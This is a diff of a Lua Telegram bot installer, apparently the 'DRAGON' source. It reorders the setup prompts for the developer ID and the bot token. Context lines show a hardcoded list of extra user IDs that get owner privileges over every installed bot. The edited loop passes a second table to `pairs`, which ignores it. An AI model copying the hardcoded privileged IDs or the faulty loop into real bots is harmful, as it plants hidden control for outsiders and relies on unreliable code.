@@ -27,7 +27,7 @@ end
 file:write(serialized)    
 file:close()  
 end  
-if not database:get(id_server..":token") then
+if not database:get(id_server..":SUDO:ID") then
 io.write('\27[38;5;77m\n                •{ installd source power }•\n\27')
 print([[
 
@@ -49,6 +49,17 @@ print([[
  
  
 ]])
+io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n\27[0;33;49m')
+local SUDOID = io.read()
+if SUDOID ~= '' then
+io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n27[0;39;49m')
+database:set(id_server..":SUDO:ID",SUDOID)
+else
+print('\27[0;31m•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉• ━ ━\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
+end 
+os.execute('lua DRAGON.lua')
+end
+if not database:get(id_server..":token") then
 io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n\27')
 local token = io.read()
 if token ~= '' then
@@ -72,17 +83,6 @@ io.write('\n\27[1;34m تم حفظ معرف البوت :\n\27[0;39;49m')
 database:set(id_server..":UserBotNew",'@'..BOTUSERNAME)
 else
 print('\n\27[1;34m لم يتم حفظ معرف البوت :')
-end 
-os.execute('lua DRAGON.lua')
-end
-if not database:get(id_server..":SUDO:ID") then
-io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n\27[0;33;49m')
-local SUDOID = io.read()
-if SUDOID ~= '' then
-io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n27[0;39;49m')
-database:set(id_server..":SUDO:ID",SUDOID)
-else
-print('\27[0;31m•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉• ━ ━\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
 end 
 os.execute('lua DRAGON.lua')
 end
@@ -228,7 +228,7 @@ end
 sudo_users = {SUDO,bot_id,1360140225,944353237,9292929292,0303030030,1770288756}   
 function SudoBot(msg)  
 local DRAGON = false  
-for k,v in pairs(sudo_users) do  
+for k,v in pairs(sudo_users,dev_users) do  
 if tonumber(msg.sender_user_id_) == tonumber(v) then  
 DRAGON = true  
 end  
